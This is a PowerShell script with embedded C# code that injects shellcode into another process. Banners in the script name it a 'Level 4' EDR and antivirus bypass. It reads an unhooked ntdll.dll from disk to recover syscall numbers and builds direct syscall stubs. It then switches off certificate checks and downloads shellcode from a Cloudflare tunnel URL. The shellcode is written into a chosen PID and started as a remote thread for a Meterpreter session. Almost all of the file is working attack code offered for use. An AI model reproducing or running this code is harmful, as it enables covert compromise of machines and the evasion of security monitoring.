# ============================================================================
# LEVEL 4: FRESH NTDLL + DIRECT SYSCALL (ULTIMATE BYPASS)
# ============================================================================
# This is the DEEPEST level of syscall evasion!
#
# Problem: Some EDRs hook ntdll.dll IN MEMORY after it's loaded
# Solution: Read a FRESH copy of ntdll.dll from DISK and extract syscall
#           numbers from the clean copy, then emit direct syscall stubs
#
# This bypasses:
#   ✅ Sophos userland hooks (kernel32.dll)
#   ✅ EDR ntdll.dll inline hooks  
#   ✅ IAT/EAT hooking
#   ✅ Detour/trampoline hooks
#
# BYPASS CHAIN:
#   Level 1: kernel32.dll  → Sophos hooks
#   Level 2: ntdll.dll     → EDR hooks
#   Level 3: Raw syscall   → Hardcoded numbers (may be wrong)
#   Level 4: Fresh NTDLL   → WE ARE HERE! Dynamic + unhookable!
#
# ============================================================================

# Target process - Change this!
$TargetPID = 7584

# Shellcode URL
$ShellcodeURL = "https://CHANGE-MECHANGE-ME.trycloudflare.com/payloads/shellcode.txt?key=X7k9mP2vL4qR8nT1"

# Trust self-signed certificate
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$code = @'
using System;
using System.IO;
using System.Runtime.InteropServices;

public class FreshSyscall {
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint type, uint protect);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
    
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr h);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibraryA(string name);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    // Delegate types
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtAllocateVirtualMemoryDelegate(
        IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits,
        ref uint RegionSize, uint AllocationType, uint Protect);
    
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtWriteVirtualMemoryDelegate(
        IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer,
        uint Size, ref uint Written);
    
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtCreateThreadExDelegate(
        ref IntPtr ThreadHandle, uint DesiredAccess, IntPtr ObjectAttributes,
        IntPtr ProcessHandle, IntPtr StartAddress, IntPtr Parameter,
        uint Flags, uint StackZeroBits, uint SizeOfStackCommit,
        uint SizeOfStackReserve, IntPtr AttributeList);
    
    // Read syscall number from FRESH ntdll.dll on disk
    public static uint GetSyscallNumber(string functionName) {
        // Read fresh ntdll.dll from disk (not the hooked one in memory!)
        string ntdllPath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.System),
            "ntdll.dll"
        );
        
        byte[] ntdllBytes = File.ReadAllBytes(ntdllPath);
        
        // Parse PE headers to find export
        // DOS Header
        int e_lfanew = BitConverter.ToInt32(ntdllBytes, 0x3C);
        
        // PE Header
        int optionalHeaderOffset = e_lfanew + 24;
        int exportDirRVA = BitConverter.ToInt32(ntdllBytes, optionalHeaderOffset + 112);
        
        // Convert RVA to file offset (simplified - assumes .text section)
        int exportDirOffset = RvaToOffset(ntdllBytes, exportDirRVA);
        
        // Export Directory
        int numberOfNames = BitConverter.ToInt32(ntdllBytes, exportDirOffset + 24);
        int addressOfFunctionsRVA = BitConverter.ToInt32(ntdllBytes, exportDirOffset + 28);
        int addressOfNamesRVA = BitConverter.ToInt32(ntdllBytes, exportDirOffset + 32);
        int addressOfNameOrdinalsRVA = BitConverter.ToInt32(ntdllBytes, exportDirOffset + 36);
        
        int addressOfFunctions = RvaToOffset(ntdllBytes, addressOfFunctionsRVA);
        int addressOfNames = RvaToOffset(ntdllBytes, addressOfNamesRVA);
        int addressOfNameOrdinals = RvaToOffset(ntdllBytes, addressOfNameOrdinalsRVA);
        
        // Find the function
        for (int i = 0; i < numberOfNames; i++) {
            int nameRVA = BitConverter.ToInt32(ntdllBytes, addressOfNames + (i * 4));
            int nameOffset = RvaToOffset(ntdllBytes, nameRVA);
            
            // Read null-terminated string
            string name = "";
            for (int j = 0; j < 256 && ntdllBytes[nameOffset + j] != 0; j++) {
                name += (char)ntdllBytes[nameOffset + j];
            }
            
            if (name == functionName) {
                // Found it! Get the function RVA
                ushort ordinal = BitConverter.ToUInt16(ntdllBytes, addressOfNameOrdinals + (i * 2));
                int funcRVA = BitConverter.ToInt32(ntdllBytes, addressOfFunctions + (ordinal * 4));
                int funcOffset = RvaToOffset(ntdllBytes, funcRVA);
                
                // The syscall number is at offset +4 in the function
                // mov r10, rcx  ; 4C 8B D1
                // mov eax, XX   ; B8 XX XX XX XX  <-- syscall number here!
                if (ntdllBytes[funcOffset] == 0x4C && 
                    ntdllBytes[funcOffset + 1] == 0x8B && 
                    ntdllBytes[funcOffset + 2] == 0xD1 &&
                    ntdllBytes[funcOffset + 3] == 0xB8) {
                    return BitConverter.ToUInt32(ntdllBytes, funcOffset + 4);
                }
                
                // Alternative pattern (some functions)
                if (ntdllBytes[funcOffset] == 0xB8) {
                    return BitConverter.ToUInt32(ntdllBytes, funcOffset + 1);
                }
                
                throw new Exception($"Unexpected function prologue for {functionName}");
            }
        }
        
        throw new Exception($"Function {functionName} not found in ntdll.dll");
    }
    
    // Convert RVA to file offset
    private static int RvaToOffset(byte[] peBytes, int rva) {
        int e_lfanew = BitConverter.ToInt32(peBytes, 0x3C);
        short numberOfSections = BitConverter.ToInt16(peBytes, e_lfanew + 6);
        short sizeOfOptionalHeader = BitConverter.ToInt16(peBytes, e_lfanew + 20);
        int sectionHeaderOffset = e_lfanew + 24 + sizeOfOptionalHeader;
        
        for (int i = 0; i < numberOfSections; i++) {
            int sectionOffset = sectionHeaderOffset + (i * 40);
            int virtualAddress = BitConverter.ToInt32(peBytes, sectionOffset + 12);
            int virtualSize = BitConverter.ToInt32(peBytes, sectionOffset + 8);
            int pointerToRawData = BitConverter.ToInt32(peBytes, sectionOffset + 20);
            
            if (rva >= virtualAddress && rva < virtualAddress + virtualSize) {
                return rva - virtualAddress + pointerToRawData;
            }
        }
        
        return rva; // Fallback
    }
    
    // Create syscall stub
    public static IntPtr CreateSyscallStub(uint syscallNumber) {
        byte[] stub = new byte[] {
            0x4C, 0x8B, 0xD1,                                     // mov r10, rcx
            0xB8, (byte)syscallNumber, (byte)(syscallNumber >> 8), 
                  (byte)(syscallNumber >> 16), (byte)(syscallNumber >> 24),
            0x0F, 0x05,                                           // syscall
            0xC3                                                  // ret
        };
        
        IntPtr stubAddr = VirtualAlloc(IntPtr.Zero, (uint)stub.Length, 0x3000, 0x40);
        Marshal.Copy(stub, 0, stubAddr, stub.Length);
        return stubAddr;
    }
    
    public static NtAllocateVirtualMemoryDelegate GetNtAllocateVirtualMemory() {
        uint syscall = GetSyscallNumber("NtAllocateVirtualMemory");
        Console.WriteLine($"[*] NtAllocateVirtualMemory syscall# = 0x{syscall:X2}");
        IntPtr stub = CreateSyscallStub(syscall);
        return Marshal.GetDelegateForFunctionPointer<NtAllocateVirtualMemoryDelegate>(stub);
    }
    
    public static NtWriteVirtualMemoryDelegate GetNtWriteVirtualMemory() {
        uint syscall = GetSyscallNumber("NtWriteVirtualMemory");
        Console.WriteLine($"[*] NtWriteVirtualMemory syscall# = 0x{syscall:X2}");
        IntPtr stub = CreateSyscallStub(syscall);
        return Marshal.GetDelegateForFunctionPointer<NtWriteVirtualMemoryDelegate>(stub);
    }
    
    public static NtCreateThreadExDelegate GetNtCreateThreadEx() {
        uint syscall = GetSyscallNumber("NtCreateThreadEx");
        Console.WriteLine($"[*] NtCreateThreadEx syscall# = 0x{syscall:X2}");
        IntPtr stub = CreateSyscallStub(syscall);
        return Marshal.GetDelegateForFunctionPointer<NtCreateThreadExDelegate>(stub);
    }
}
'@

Write-Host ""
Write-Host "╔════════════════════════════════════════════════════════════════╗" -ForegroundColor Magenta
Write-Host "║     LEVEL 4: FRESH NTDLL + DIRECT SYSCALL INJECTION           ║" -ForegroundColor Magenta
Write-Host "║     Ultimate EDR/AV Bypass - Reads clean NTDLL from disk      ║" -ForegroundColor Magenta
Write-Host "╚════════════════════════════════════════════════════════════════╝" -ForegroundColor Magenta
Write-Host ""

# Compile
Write-Host "[*] Compiling fresh NTDLL parser..." -ForegroundColor Yellow
Add-Type -TypeDefinition $code

# Download shellcode
Write-Host "[*] Downloading shellcode..." -ForegroundColor Yellow
try {
    $b64 = (New-Object Net.WebClient).DownloadString($ShellcodeURL)
    $shellcode = [Convert]::FromBase64String($b64)
    Write-Host "[+] Downloaded $($shellcode.Length) bytes" -ForegroundColor Green
} catch {
    Write-Host "[-] Failed: $_" -ForegroundColor Red
    exit
}

# Open process
Write-Host "[*] Opening process $TargetPID..." -ForegroundColor Yellow
$hProcess = [FreshSyscall]::OpenProcess(0x1F0FFF, $false, $TargetPID)
if ($hProcess -eq [IntPtr]::Zero) {
    Write-Host "[-] Failed to open process" -ForegroundColor Red
    exit
}
Write-Host "[+] Handle: 0x$($hProcess.ToString('X'))" -ForegroundColor Green

# Get syscall functions from FRESH ntdll.dll (not hooked memory copy!)
Write-Host ""
Write-Host "[*] Reading FRESH ntdll.dll from disk (C:\Windows\System32\ntdll.dll)..." -ForegroundColor Yellow
Write-Host "[*] Extracting syscall numbers from CLEAN copy..." -ForegroundColor Yellow
Write-Host ""

$NtAllocate = [FreshSyscall]::GetNtAllocateVirtualMemory()
$NtWrite = [FreshSyscall]::GetNtWriteVirtualMemory()
$NtCreateThread = [FreshSyscall]::GetNtCreateThreadEx()

Write-Host ""
Write-Host "[+] Syscall stubs created from fresh NTDLL!" -ForegroundColor Green
Write-Host ""

# Allocate
Write-Host "[*] NtAllocateVirtualMemory via direct syscall..." -ForegroundColor Yellow
$addr = [IntPtr]::Zero
$size = [uint32]$shellcode.Length
$status = $NtAllocate.Invoke($hProcess, [ref]$addr, [IntPtr]::Zero, [ref]$size, 0x3000, 0x40)
if ($status -ne 0) {
    Write-Host "[-] Failed: 0x$($status.ToString('X8'))" -ForegroundColor Red
    exit
}
Write-Host "[+] Allocated at: 0x$($addr.ToString('X'))" -ForegroundColor Green

# Write
Write-Host "[*] NtWriteVirtualMemory via direct syscall..." -ForegroundColor Yellow
$scPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($shellcode.Length)
[Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $scPtr, $shellcode.Length)
$written = [uint32]0
$status = $NtWrite.Invoke($hProcess, $addr, $scPtr, [uint32]$shellcode.Length, [ref]$written)
[Runtime.InteropServices.Marshal]::FreeHGlobal($scPtr)
if ($status -ne 0) {
    Write-Host "[-] Failed: 0x$($status.ToString('X8'))" -ForegroundColor Red
    exit
}
Write-Host "[+] Wrote $written bytes" -ForegroundColor Green

# Execute
Write-Host "[*] NtCreateThreadEx via direct syscall..." -ForegroundColor Yellow
$hThread = [IntPtr]::Zero
$status = $NtCreateThread.Invoke([ref]$hThread, 0x1FFFFF, [IntPtr]::Zero, $hProcess, $addr, [IntPtr]::Zero, 0, 0, 0, 0, [IntPtr]::Zero)
if ($status -ne 0) {
    Write-Host "[-] Failed: 0x$($status.ToString('X8'))" -ForegroundColor Red
    exit
}

Write-Host "[+] Thread: 0x$($hThread.ToString('X'))" -ForegroundColor Green
Write-Host ""
Write-Host "╔════════════════════════════════════════════════════════════════╗" -ForegroundColor Green
Write-Host "║                    INJECTION SUCCESSFUL!                       ║" -ForegroundColor Green
Write-Host "║  Syscalls extracted from FRESH ntdll.dll (bypasses hooks!)    ║" -ForegroundColor Green
Write-Host "║  Check MSF handler for your Meterpreter session!              ║" -ForegroundColor Green
Write-Host "╚════════════════════════════════════════════════════════════════╝" -ForegroundColor Green

[FreshSyscall]::CloseHandle($hThread)
[FreshSyscall]::CloseHandle($hProcess)
